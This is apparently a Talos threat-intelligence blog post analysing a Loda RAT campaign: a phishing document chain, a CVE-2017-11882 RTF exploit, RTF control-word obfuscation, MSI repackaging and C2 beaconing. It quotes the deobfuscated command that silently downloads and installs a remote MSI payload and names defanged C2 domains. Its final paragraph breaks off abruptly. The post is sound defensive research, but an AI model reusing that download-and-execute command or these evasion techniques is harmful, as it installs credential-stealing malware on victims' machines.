    <h1 class="text-center">Loda RAT Grows Up</h1>

    <div class="text-center m-1">
        <div class="post-author">
            <span>By </span>
                <a href="https://blog.talosintelligence.com/author/chris-neal/">Chris Neal</a>
        </div>

        <br/>
        <time class="post-datetime" datetime="February 12, 2020 14:45">
            Wednesday, February 12, 2020 14:45
        </time>

        <div class="m-3">
                            <a href="/category/rat/" class="category primary-category">
                                RAT
                            </a>
                                </div>
    </div>

    <section class="post-content-wrapper mt-5">
        <div class="post-content">
            <p><br> By <a href="https://twitter.com/g0jirasan">Chris Neal</a>.</p><ul><li>Over the past several months, Cisco Talos has observed a malware campaign that utilizes websites hosting a new version of Loda, a remote access trojan (RAT) written in AutoIT.</li><li>These websites also host malicious documents that begin a multi-stage infection chain which ultimately serves a malicious MSI file. The second stage document exploits <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-11882">CVE-2017-11882</a> to download and run the MSI file, which contains Loda version 1.1.1.</li><li>This campaign appears to be targeting countries in South America and Central America, as well as the U.S. <br></li></ul><h2 id="what-s-new">What's New? </h2><p>Talos has observed several changes in this version of Loda. The obfuscation technique used within the AutoIT script changed to a different form of string encoding. Multiple persistence mechanisms have been employed to ensure Loda continues running on the infected host following reboots. Lastly, the new version leverages WMI to enumerate antivirus solutions running on the infected host.</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/-W3xttXrJkGw/XkQ0kzArPhI/AAAAAAAAAAY/7nTQJe-2mT4pbLe_hXWTln9JltHGuvm9wCLcBGAsYHQ/s320/image11.png" class="kg-image" alt loading="lazy"></figure><h3 id="how-did-it-work">How Did it Work? <br></h3><p>The Loda sample analyzed in this post is delivered via a document chain. The first contains an OOXML relationship to a second document that contains an exploit. Once the exploit is triggered, an MSI file that contains the Loda RAT is downloaded to the target host and executed. While the main purpose of this RAT is to steal usernames, passwords, and cookies saved within browsers, it also has keylogging, sound recording, screenshotting and the ability to allow the threat actor to send messages to the infected host.</p><h3 id="so-what">So What? </h3><p>Loda is a simple, yet effective, RAT that has matured over time. This RAT is a good example of how effective relatively simple techniques combined with basic obfuscation can be. The techniques this malware employs are of fairly low complexity and show that slight changes in implementation can significantly reduce detection rates.</p><h2 id="the-campaign">The Campaign <br> </h2><p>Telemetry from Cisco Umbrella shows that this campaign is quite active and seems to be targeting countries in South America, Central America and the U.S. The majority of the queries to the C2 domain "4success[.]zapto[.]org" originate from Brazil, Costa Rica and the United States. Similarly, the queries to "success20[.]hopto[.]org" originate from Argentina, Brazil and the United States. Our telemetry also shows that C2 communications go as far back as the last quarter of 2019.</p><figure class="kg-card kg-image-card"><img src="https://blog.talosintelligence.com/content/images/-Qlhord5ksbw/XkQ023vHMLI/AAAAAAAAAAg/C3D1GojNkcwhBz2JxyCQzNqeRVPuNve9ACLcBGAsYHQ/s640/image6.png" class="kg-image" alt loading="lazy"></figure><!--kg-card-begin: html--><table><tbody><tr><td><a target="_blank" href="https://blog.talosintelligence.com/content/images/-6xcjHOb0o0k/XkQ09VqAl4I/AAAAAAAAAAk/56h0uwBKxPECtJ_csEdzofAAuE7SjYEZQCLcBGAsYHQ/s1600/image3.png"><img height="246" src="https://blog.talosintelligence.com/content/images/-6xcjHOb0o0k/XkQ09VqAl4I/AAAAAAAAAAk/56h0uwBKxPECtJ_csEdzofAAuE7SjYEZQCLcBGAsYHQ/s640/image3.png" width="640"></a>
</td></tr><tr><td>DNS queries to 4success[.]zapto[.]org
</td></tr></tbody></table><!--kg-card-end: html--><h3 id="infection-chain">Infection chain </h3><p>At the time of analysis, several steps of the infection chain had a relatively low detection rate due to various obfuscation techniques. The initial document is delivered via a phishing email that contains the first-stage document as an attachment.</p><!--kg-card-begin: html--><table><tbody><tr><td><a target="_blank" href="https://blog.talosintelligence.com/content/images/-_w4YGmeYCZ8/XkQ1KCElhJI/AAAAAAAAAAw/tngkt7LSeUAPisX0vB9A6_7-tEtXyoefwCLcBGAsYHQ/s1600/image1.png"><img height="304" src="https://blog.talosintelligence.com/content/images/-_w4YGmeYCZ8/XkQ1KCElhJI/AAAAAAAAAAw/tngkt7LSeUAPisX0vB9A6_7-tEtXyoefwCLcBGAsYHQ/s640/image1.png" width="640"></a>
</td></tr><tr><td>Example of an email from this campaign
</td></tr></tbody></table><!--kg-card-end: html--><p>The first document in the infection chain, titled in one instance "comprobante de confirmación de pago.docx" contains an OOXML relationship, located in "/word/_rels" that points to a second document at "http://lcodigo[.]com/apiW/config/uploads/tmp/documento.doc". Aside from this OOXML relationship, the initial document isn't particularly noteworthy. The document uses this two-stage document technique to bypass some email filters.</p><!--kg-card-begin: html--><table><tbody><tr><td><a target="_blank" href="https://blog.talosintelligence.com/content/images/-Kp_U9b9sVNg/XkQ2iBEI-eI/AAAAAAAAABo/KuD_Ky73Ga8JrLTAz3wTtxK2Wel0Z4RsQCLcBGAsYHQ/s1600/image4.png"><img height="68" src="https://blog.talosintelligence.com/content/images/-Kp_U9b9sVNg/XkQ2iBEI-eI/AAAAAAAAABo/KuD_Ky73Ga8JrLTAz3wTtxK2Wel0Z4RsQCLcBGAsYHQ/s640/image4.png" width="640"></a>
</td></tr><tr><td>OOXML Relationship
</td></tr></tbody></table><!--kg-card-end: html--><p>The second document is a Rich Text Format document that contains a payload within an obfuscated OLE object which is then executed by exploiting CVE-2017-11882, an arbitrary code execution vulnerability in some versions of Microsoft Office. The contents of the Author field, "obidah qudah" in the metadata of this document appears to be constant across all samples analyzed during the investigation.</p><p>When we looked deeper into this author's name, we discovered they have a relatively long history of being associated with malicious RTF documents. Starting in 2017, there have been just under 1,300 malicious documents submitted to VirusTotal that contain "obidah qudah" in the author field. An overwhelming majority of these submissions are RTF documents that exploit CVE-2017-11882.</p><p>However, the "Last Modified By" field is not static throughout these documents. There appear to be multiple campaigns over the last few years, starting in 2017, that use the "obidah qudah" author name, with each campaign using a different "Last Modified By" field, with many serving malware other than Loda. It is unclear whether these campaigns were initiated by the same threat actor, or if a single malicious RTF document builder was used by multiple different actors. In the documents analyzed in this post, the "Last Modified By" value is set to "Richard."</p><!--kg-card-begin: html--><table><tbody><tr><td><a target="_blank" href="https://blog.talosintelligence.com/content/images/-chnPjwonRYE/XkQ2mRVw6jI/AAAAAAAAABs/6NCuZi6cWN4zQpLo1srMZ2YnGVg-K_YjACLcBGAsYHQ/s1600/image13.png"><img height="306" src="https://blog.talosintelligence.com/content/images/-chnPjwonRYE/XkQ2mRVw6jI/AAAAAAAAABs/6NCuZi6cWN4zQpLo1srMZ2YnGVg-K_YjACLcBGAsYHQ/s400/image13.png" width="400"></a>
</td></tr><tr><td>Author labeled as "obidah qudah"
</td></tr></tbody></table><!--kg-card-end: html--><p>The OLE object within this document that contains the exploit and payload employs an interesting obfuscation technique that utilizes RTF control words. </p><!--kg-card-begin: html--><table><tbody><tr><td><a target="_blank" href="https://blog.talosintelligence.com/content/images/-pbPn_cmcxw4/XkQ2pzMSTMI/AAAAAAAAABw/zpYMMX7YAi0APRyCGWFTr-t89OVO_gbtACLcBGAsYHQ/s1600/image5.png"><img height="308" src="https://blog.talosintelligence.com/content/images/-pbPn_cmcxw4/XkQ2pzMSTMI/AAAAAAAAABw/zpYMMX7YAi0APRyCGWFTr-t89OVO_gbtACLcBGAsYHQ/s640/image5.png" width="640"></a>
</td></tr><tr><td>Obfuscated payload
</td></tr></tbody></table><!--kg-card-end: html--><p>The control word "\par" used in the object indicates the end of a paragraph, while the "\*" has a slightly more complex function. The "\*" control word instructs an RTF reader to ignore the following control words only if they are not understood by the reader, which allows the author to include false control words (ex: \par67234). Using this technique to break up the OLE object not only obfuscates the payload but also does not allow RTF parsers to read the object in its entirety. Once it is executed, the control words will be ignored, concatenating the bytes in between into the exploit payload as shown below.</p><!--kg-card-begin: html--><table><tbody><tr><td><a target="_blank" href="https://blog.talosintelligence.com/content/images/-hjwHFVbCy-U/XkQ2w2YdOpI/AAAAAAAAAB0/GLieYB-DAAc60PxzRftQvkH_Tp9qUfasQCLcBGAsYHQ/s1600/image14.png"><img height="166" src="https://blog.talosintelligence.com/content/images/-hjwHFVbCy-U/XkQ2w2YdOpI/AAAAAAAAAB0/GLieYB-DAAc60PxzRftQvkH_Tp9qUfasQCLcBGAsYHQ/s640/image14.png" width="640"></a>
</td></tr><tr><td>Deobfuscated payload
</td></tr></tbody></table><!--kg-card-end: html--><p>Within this payload, the command "cmd.exe &amp; /C CD C: &amp; msiexec.exe /i http://lcodigo[.]com/apiW/config/uploads/tmp/fkrkdn.msi /quiet" can be seen. Once the exploit is triggered, a malicious MSI file is then downloaded and executed.</p><p>This MSI was created using Exe2Msi, a common tool used to repackage Windows executables as an MSI file. Although this tool is most often used with legitimate software, it is also frequently used by malware authors. One of the benefits of delivering malware in an MSI package is that it provides a lower detection rate. Simply repackaging a malicious executable as an MSI file can reduce detection rates with very little effort. If repackaged as an MSI, the detection rate of a malicious executable can drop by up to 50 percent on VirusTotal. Combined with other forms of obfuscation, this can result in a crude, yet effective, means of evasion.</p><h2 id="the-malware">The malware </h2><p>At execution, "fkrkdn.msi" extracts an executable at "C:\Users\&lt;user&gt;\AppData\Roaming\Windata\JLMWFF.exe." This is the Loda 1.1.1 binary, which is a compiled AutoIT script. A detailed write-up by Proofpoint on a previous version of Loda and its functionality can be found <a href="https://www.proofpoint.com/us/threat-insight/post/introducing-loda-malware">here</a>.</p><p>The initial C2 beacon was captured from "JLMWFF.exe" which contained the unique signature "ZeXro0" repeated several times, which is not present in other versions of Loda. The C2 comms pointed to "4success[.]zapto[.]org" contain information about the infected host, including OS version, architecture and username. This also reveals that this version of Loda is "1.1.1." Aside from the unique signature, this beacon format is the same as previous versions.</p><p>Even though this new version of Loda has nearly identical functionality as previous versions, there are significant differences in implementation and design. Some of the functions within the script have been completely rewritten, with the most readily apparent change being the obfuscation technique used. In version 1.1.1, almost every string or variable is obfuscated using the simple encoding algorithm shown below.</p><!--kg-card-begin: html--><table><tbody><tr><td><a target="_blank" href="https://blog.talosintelligence.com/content/images/-GymBYcquFUo/XkQ1oTJpbZI/AAAAAAAAABE/P4AhXNsHXKoKh8g02uNDQ7QANWuYB2S8QCLcBGAsYHQ/s1600/image12.png"><img height="193" src="https://blog.talosintelligence.com/content/images/-GymBYcquFUo/XkQ1oTJpbZI/AAAAAAAAABE/P4AhXNsHXKoKh8g02uNDQ7QANWuYB2S8QCLcBGAsYHQ/s320/image12.png" width="320"></a>
</td></tr><tr><td>Loda's encoding algorithm
</td></tr></tbody></table><!--kg-card-end: html--><p>There are a few key changes in functionality in version 1.1.1. To detect what antivirus software is running on the host, earlier versions of Loda would call the AutoIT function PROCESSEXISTS() for each antivirus software process name. The credential stealing capabilities could lead to significant financial loss or a potential data breach.
